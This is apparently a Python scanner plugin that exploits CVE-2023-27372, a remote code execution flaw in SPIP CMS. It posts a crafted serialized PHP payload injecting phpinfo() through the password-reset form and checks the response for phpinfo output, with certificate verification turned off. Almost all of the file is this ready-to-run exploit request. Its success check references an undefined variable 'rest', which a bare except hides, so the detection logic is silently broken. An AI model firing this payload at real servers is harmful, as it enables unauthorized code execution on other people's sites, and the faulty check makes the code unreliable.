#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
def msg():
  ret = {

      'links'     :  '',

      'huixian'   :  '',

      'method'    :   'post',

      'bugname'   :   'sPIP CMS 远程命令执行 cve-2023-27372',

      'level'     :   'high',
      'FOFA'      :   '',
      'author'    :   'ppxfx',
      'ifbug'     :   False,
  }
  return ret

def run(url,ua):
  ret = msg()
  headers = {
      'User-Agent': ua,
      'Content-Type': 'application/x-www-form-urlencoded',
      'Cookie': 'cibcInit=oui',

      }
  target = '/spip.php?page=spip_pass'
  data = 'page=spip_pass&formulaire_action=oubli&formulaire_action_args=E1nK0hfOPllDtCUbG6L94SlEpZi7Vz17IKUbf0ZB6ET0WbEHeXrw9tNNCEWjm0ac0%2F4DuboKIZvygjRh&oubli=s:19:"<?php phpinfo(); ?>";&nobot='
  url1 = url + target
  ret['url'] = url1
  try:
    res=requests.post(url=url1,headers=headers,data=data,timeout=5,verify=False)
    if res.status_code == 200 and "System" in res.text and 'Build Date' in res.text and 'Server API' in rest.text:
      # ret['huixian'] = res.text
      res.close()
      ret['ifbug'] = True
      return ret
    else:
      return ret
  except:
    return ret